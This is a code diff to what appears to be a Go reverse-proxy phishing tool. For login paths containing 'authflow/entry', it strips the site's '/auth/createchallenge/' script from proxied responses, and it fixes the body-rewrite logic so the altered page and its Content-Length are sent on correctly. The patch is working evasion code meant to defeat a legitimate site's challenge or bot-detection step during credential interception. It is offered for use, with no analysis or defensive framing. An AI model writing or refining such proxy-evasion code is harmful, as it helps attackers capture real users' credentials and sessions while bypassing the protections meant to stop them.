@@ -1131,19 +1131,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			// Read the response body
 			body, err := ioutil.ReadAll(resp.Body)
 			
+			
 			// Check if the path matches "authflow/entry"
 			if strings.Contains(resp.Request.URL.Path, "authflow/entry") {
 			    // Modify the body to remove <script async src="/auth/createchallenge/...">
-			    modifiedBody := regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), "")
-			    log.Info("Change potential blocks")
-			    // Restore the modified body to the response
-			    body = ioutil.NopCloser(bytes.NewBuffer([]byte(modifiedBody)))
-			    resp.ContentLength = int64(len(modifiedBody))
-			    resp.Header.Set("Content-Length", strconv.Itoa(len(modifiedBody)))
-			} else {
-			    // Restore the original body to the response
-			    body = ioutil.NopCloser(bytes.NewBuffer(body))
+			    body = []byte(regexp.MustCompile(`<script\s+async\s+src="/auth/createchallenge/.*?"></script>`).ReplaceAllString(string(body), ""))
 			}
+			
+			// Restore the modified or original body to the response
+			resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+			resp.ContentLength = int64(len(body))
+			resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
